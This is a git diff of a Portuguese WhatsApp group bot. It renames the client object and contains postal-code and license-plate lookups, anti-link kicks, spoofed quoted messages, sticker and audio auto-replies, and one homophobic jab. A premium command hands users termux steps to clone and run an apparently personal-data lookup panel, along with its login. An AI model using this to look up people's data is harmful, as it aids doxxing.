          let cep = `*🔍CONSULTA REALIZADA🔍* \n\n ➸ *CEP:* ${res.data.cep} \n\n ➸ *ENDEREÇO:* ${res.data.logradouro}\n\n ➸ *COMPLEMENTO:* ${res.data.complemento} \n\n ➸ *BAIRRO:* ${res.data.bairro} \n\n ➸ *LOCALIDADE:* ${res.data.localidade} \n\n ➸ *UF:* ${res.data.uf}\n\n ➸ *DDD:* ${res.data.ddd} \n\n *📌BY: TOMIOKA BOT* `;
-    tomioka.sendMessage(id, cep ,MessageType.text);
+    client.sendMessage(id, cep ,MessageType.text);
 }) 
 }
 		
@@ -2561,7 +2398,7 @@ if (text.includes("placa"))
   { const aris = text.replace(/!placa /, "") 
   axios.get(`https://apicarros.com/v1/consulta/${aris}/json`).then((res) =>{ 
   let hasil = ` *🔍CONSULTA REALIZADA🔍* \n\n ➸ *ANO:*  ${res.data.ano}\n ➸ *ANO MODELO* : ${res.data.anoModelo}\n ➸ *CHASSI* : ${res.data.chassi}\n ➸ *CODIGO RETORNO* : ${res.data.codigoRetorno}\n ➸ *CODIGO SITUACAO* : ${res.data.codigoSituacao}\n ➸ *COR* : ${res.data.cor}\n ➸ *MARCA* : ${res.data.marca}\n ➸ *MUNICIPIO* : ${res.data.municipio}\n ➸ *SITUACAO* : ${res.data.situacao}\n ➸ *UF* : ${res.data.uf}\n *📌BY:TOMIOKA BOT*` 
-  tomioka.sendMessage(id, hasil, MessageType.text); 
+  client.sendMessage(id, hasil, MessageType.text); 
  })
  }		        
 
@@ -2569,23 +2406,23 @@ if (text.includes("placa"))
 		if (!isGroup) return
 		if (!isAntiRacismo) return
 		if (isGroupAdmins) return fakegroup ('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		if (messagesC.includes("#izinadmin")) return fakegroup ("#izinadmin diterima")
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
 		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo!`)
 	}
 	if (budy.includes("reply")){
-	        meta = await tomioka.loadMessage(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
-            res = await tomioka.generateForwardMessageContent(meta) 
-            res = await tomioka.prepareMessageFromContent(from, res, {quoted:mek, contextInfo:tomio, contextInfo:{mentionedJid:[]}}) 
-            tomioka.relayWAMessage(res)
+	        meta = await client.loadMessage(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
+            res = await client.generateForwardMessageContent(meta) 
+            res = await client.prepareMessageFromContent(from, res, {quoted:mek, contextInfo:tomio, contextInfo:{mentionedJid:[]}}) 
+            client.relayWAMessage(res)
 	}
 	
 	        if (messagesC.includes("macaco")){
 		if (!isGroup) return
 		if (!isAntiRacismo) return
 		if (isGroupAdmins) return fakegroup ('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		if (messagesC.includes("#izinadmin")) return fakegroup ("#izinadmin diterima")
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
 		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo!`)
@@ -2595,7 +2432,7 @@ if (text.includes("placa"))
 		if (!isGroup) return
 		if (!isAntiRacismo) return
 		if (isGroupAdmins) return fakegroup ('cara, nao fale essas coisas, é errado, mas vc e admin n irei te banir')
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		if (messagesC.includes("#izinadmin")) return fakegroup ("#izinadmin diterima")
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
 		reply(`tchau racista ${sender.split("@")[0]} voce sera expulso deste grupo!`)
@@ -2613,10 +2450,10 @@ if (text.includes("placa"))
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return; 
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
 		reply(`link detectado ${sender.split("@")[0]} voce sera expulso deste grupo!`)
-        tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+        client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 	
 	/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆***\\\\\
@@ -2625,9 +2462,9 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return;
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 
 /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈***\\\\\
@@ -2636,9 +2473,9 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return;
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 	
 	/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 ZAP***\\\\\
@@ -2647,9 +2484,9 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return;
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 
 /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇***\\\\\
@@ -2658,9 +2495,9 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return; 
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 
 /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙑𝙄𝘿𝙀𝙊***\\\\\
@@ -2669,9 +2506,9 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return; 
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
 	
 /////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈***\\\\\
@@ -2680,84 +2517,84 @@ if (messagesC.includes("facebook.com")){
 		if (!isGroup) return;
 		if (!isAntiLink) return;
 		if (isGroupAdmins) return;
-		tomioka.updatePresence(from, Presence.composing)
+		client.updatePresence(from, Presence.composing)
 		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
-			tomioka.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
+			client.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
 	}
     
 	if (messagesC.includes("Tomiokabot")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("oi?")
 	}
 	
 		if (messagesC.includes("cadebot")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("olha eu aquiiiii🥰")
 	}
 	
 	if (messagesC.includes("botlindo")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("obrigado amor😍")
 	}
 	
     if (messagesC.includes("teamobot")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("tbm te amo amor🥰")
 	}
 	
 	if (messagesC.includes("chato")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("vc que é 😼")
 	}
 	
 	if (messagesC.includes("rsrs")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("vishh... nem vou falar nd.. 🤭")
 	}
 	
 	if ((budy === 'LINDO') || (budy === 'Lindo') || (budy === 'lindo')) {
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ('eu?🥺')
 	}
 	
 	if ((budy === 'PREFIXO') || (budy === 'Prefixo') || (budy === 'prefixo')) {
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup (`meu prefixo é: ${prefix}`)
 	}
 	
 	if (messagesC.includes("mt1")){
 		if (!isPremium) return fakegroup (mess.only.premium)
 		
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			reply("Você escolheu Kiny painel \n copie e cole cada um desses comandos no seu termux") 
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			fakegroup ("💻COMANDOS💻\n\npkg update\n\npkg upgrade\n\npkg install python\n\npkg install python2\n\npkg intall python3\n\npkg install git\n\ngit clone  https://github.com/Kiny-Kiny/Kiny-Painel ​ \n\ncd Kiny-Painel\n\npython3 main.py\n\nUsername: Kiny\n\nPassword: VirtualInsanity") 
 	}
 	
 	       if (messagesC.includes("allofme")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/allofme.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/allofme.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
 	        if (messagesC.includes("happier")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/happier.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/happier.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
 	
             if (messagesC.includes("nyanpasu")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/nyanpasu.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/nyanpasu.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
 	        if (messagesC.includes("bumps")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/Goosebumps.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/Goosebumps.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	           
 	            if (messagesC.includes("stealmygirl")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/stealmygirl.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/stealmygirl.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
             }
 	
 	if ((budy === 'BOT') || (budy === 'Bot') || (budy === 'bot')) {
@@ -2767,23 +2604,23 @@ if (!codeInvite) return fakegroup (`Sou o ᴛᴏᴍɪᴏᴋᴀ ʙᴏᴛ\n\nse qu
 if (!codeInvite) return fakegroup (`Sou o ᴛᴏᴍɪᴏᴋᴀ ʙᴏᴛ\n\nse quer ver meu menu mande a palavra ajuda(sem o prefixo)`)     
   }           
 	           if (messagesC.includes("youloved")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/youloved.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: true, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/youloved.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: true, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	          
 	           if (messagesC.includes("grateful")){
-			tomioka.updatePresence(from, Presence.composing)
-            tomioka.sendMessage(from, fs.readFileSync('./assets/Neffex_grateful.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+			client.updatePresence(from, Presence.composing)
+            client.sendMessage(from, fs.readFileSync('./assets/Neffex_grateful.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
 			if (messagesC.includes("dbz")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
 			tujuh = fs.readFileSync('./assets/Dbz.mp3');
-            tomioka.sendMessage(from, fs.readFileSync('./assets/Dbz.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+            client.sendMessage(from, fs.readFileSync('./assets/Dbz.mp3'), audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 	}
 	
                  if (messagesC.includes("@554498220867")){
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tomioka.webp'), sticker, {contextInfo: null, quoted: ftoko})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/tomioka.webp'), sticker, {contextInfo: null, quoted: ftoko ,contextInfo: tomis})
     }
     //RESETAR JOGO DA VELHA POR #
             if (messagesC.includes("#")){
@@ -2792,7 +2629,7 @@ if (!codeInvite) return fakegroup (`Sou o ᴛᴏᴍɪᴏᴋᴀ ʙᴏᴛ\n\nse qu
                          fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
 
                          const chatJqual = `*🕹️JOGO DA VELHA RESETADO...🕹️*`
-                   tomioka.sendMessage(from, chatJqual, MessageType.text, )
+                   client.sendMessage(from, chatJqual, MessageType.text, )
 
                     } else {
 
@@ -2800,38 +2637,38 @@ if (!codeInvite) return fakegroup (`Sou o ᴛᴏᴍɪᴏᴋᴀ ʙᴏᴛ\n\nse qu
 
                     }}
 	            if ((budy === 'AÉ') || (budy === 'Aé') || (budy === 'aé')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/Aé.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/Aé.webp'), sticker, {contextInfo: null, quoted: tomio})
 }
                 if ((budy === 'F') || (budy === 'F') || (budy === 'f')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/F.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/F.webp'), sticker, {contextInfo: null, quoted: tomio})
 }
                   if ((budy === 'QUE') || (budy === 'Que') || (budy === 'que')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/Q.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/Q.webp'), sticker, {contextInfo: null, quoted: tomio})
     }
                
                 if ((budy === 'OIBOT') || (budy === 'Oibot') || (budy === 'oibot')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/oibot.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/oibot.webp'), sticker, {contextInfo: null, quoted: tomio})
                 
 }
 if ((budy === 'FRIO') || (budy === 'Frio') || (budy === 'frio')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/frio.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/frio.webp'), sticker, {contextInfo: null, quoted: tomio})
                 
 }
 if ((budy === 'CALCULISTA') || (budy === 'Calculista') || (budy === 'calculista')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/calculista.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/calculista.webp'), sticker, {contextInfo: null, quoted: tomio})
                 
 }
 if (msgReceived == "bom dia"){
-tomioka.sendMessage(from, fs.readFileSync('./figurinhas/dia.webp'), sticker, {contextInfo: null, quoted: tomio})
+client.sendMessage(from, fs.readFileSync('./figurinhas/dia.webp'), sticker, {contextInfo: null, quoted: tomio})
 
 	}
 	if (msgReceived == "boa noite"){
-tomioka.sendMessage(from, fs.readFileSync('./figurinhas/noite.webp'), sticker, {contextInfo: null, quoted: tomio})
+client.sendMessage(from, fs.readFileSync('./figurinhas/noite.webp'), sticker, {contextInfo: null, quoted: tomio})
 
 	}
            
                 if ((budy === 'TOPE') || (budy === 'Tope') || (budy === 'tope')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tope.webp'), sticker, {contextInfo: null, quoted: tomio})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/tope.webp'), sticker, {contextInfo: null, quoted: tomio})
                 
 }
 
@@ -2840,41 +2677,41 @@ tomioka.sendMessage(from, fs.readFileSync('./figurinhas/noite.webp'), sticker, {
                 
 }
                 if ((budy === 'BAN') || (budy === 'Ban') || (budy === 'ban')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/ban.webp'), sticker, {contextInfo: null, quoted: ftoko})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/ban.webp'), sticker, {contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 
 }
 
                    if ((budy === 'TOOP') || (budy === 'Toop') || (budy === 'toop')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tudo.webp'), sticker, {contextInfo: null, quoted: ftoko})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/tudo.webp'), sticker, {contextInfo: null, quoted: ftoko ,contextInfo: tomis})
 }
                   if ((budy === 'TOMIOKINHA') || (budy === 'Tomiokinha') || (budy === 'tomiokinha')) {
-                tomioka.sendMessage(from, fs.readFileSync('./figurinhas/tomiokinha.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+                client.sendMessage(from, fs.readFileSync('./figurinhas/tomiokinha.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
              
    }
 	            if (budy.match('ksks')) {
-tomioka.sendMessage(from, fs.readFileSync('./figurinhas/kkk.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+client.sendMessage(from, fs.readFileSync('./figurinhas/kkk.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 }
 if (budy.match('monster')) {
-tomioka.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
+client.sendMessage(from, fs.readFileSync('./figurinhas/monster.webp'), sticker, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
 }
 
 					if (messagesC.includes("gay")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
             reply('teu pai?')
 	}
 	if (messagesC.includes("rumm")){
-			tomioka.updatePresence(from, Presence.composing)
+			client.updatePresence(from, Presence.composing)
             reply('rummmmm;^;')
 	}
 	
 	
 			if ((budy === 'BV') || (budy === 'Bv') || (budy === 'bv')) {
-			tomioka.updatePresence(from, Presence.composing)
